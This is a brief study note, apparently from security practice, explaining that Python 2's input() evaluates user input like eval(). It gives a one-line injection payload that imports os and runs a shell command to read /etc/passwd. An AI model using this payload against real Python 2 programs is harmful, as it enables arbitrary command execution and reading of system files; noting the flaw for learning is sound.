Learnings:
input() in python2 is not safe, equivalent to eval() 
exploiting input() command: 

__import__("os").system('cat /etc/passwd')

